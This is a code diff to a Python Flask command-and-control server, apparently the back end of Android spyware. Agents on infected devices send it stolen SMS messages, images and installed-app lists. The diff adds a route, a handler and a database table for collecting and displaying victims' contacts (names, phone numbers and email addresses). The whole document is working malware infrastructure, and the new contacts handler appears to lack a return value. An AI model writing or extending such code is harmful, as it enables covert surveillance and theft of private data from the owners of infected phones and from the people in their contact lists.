@@ -39,6 +39,12 @@ def viewApp():
     data_rows, columns = get_data_sql(sql)
     return render_template("app.html", title="Installed apps", columns=columns, data=data_rows)
 
+@app.route("/contacts")
+def viewContacts():
+    sql = "SELECT * FROM contacts"
+    data_rows, columns = get_data_sql(sql)
+    return render_template("contacts.html", title="contacts", columns=columns, data=data_rows)
+
 #############
 # C2 Routes #
 #############
@@ -103,6 +109,8 @@ def receiveResult(id):
             return handle_images(content["data"], id)
         elif code == "app":
             return handle_app(content["data"], id)
+        elif code == "contacts":
+            return handle_contacts(content["data"], id)
         
     else:
         return ("\n", 204)
@@ -145,7 +153,6 @@ def handle_images(content, id):
         sql = "INSERT INTO images VALUES (?, ?)"
         args = (id, path)
         writeToDatabase(sql, args)
-        
     
     return ("Success", 200)
 
@@ -164,6 +171,21 @@ def handle_app(content, id):
     
     
     return ("Success", 200)
+
+
+def handle_contacts(content, id):
+    print(f"Received contacts data: {content}\n\n")
+    clearAgentTasks(id)
+    for json_data in content:
+        name = json_data.get("ContactName", "")
+        number = json_data.get("ContactNumber", "")
+        email = json_data.get("Email", "")
+        print(name, number, email)
+
+        # Save data to database
+        sql = "INSERT INTO contacts VALUES (?, ?, ?, ?)"
+        args = (id, name, number, email)
+        writeToDatabase(sql, args)
 
 ####################
 # Helper functions #
@@ -223,7 +245,8 @@ def init_database():
             "CREATE TABLE IF NOT EXISTS agents(id TEXT)",
             "CREATE TABLE IF NOT EXISTS sms(id TEXT, address TEXT, body TEXT, formatted_date TEXT, type INT)",
             "CREATE TABLE IF NOT EXISTS images (id TEXT, path TEXT)",
-            "CREATE TABLE IF NOT EXISTS app(id TEXT, package TEXT, sourceDir TEXT, launchActivity TEXT)"
+            "CREATE TABLE IF NOT EXISTS app(id TEXT, package TEXT, sourceDir TEXT, launchActivity TEXT)",
+            "CREATE TABLE IF NOT EXISTS contacts(id TEXT, displayName TEXT, phoneNumber TEXT, email TEXT)"
         ]
 
         for sql in sqls:
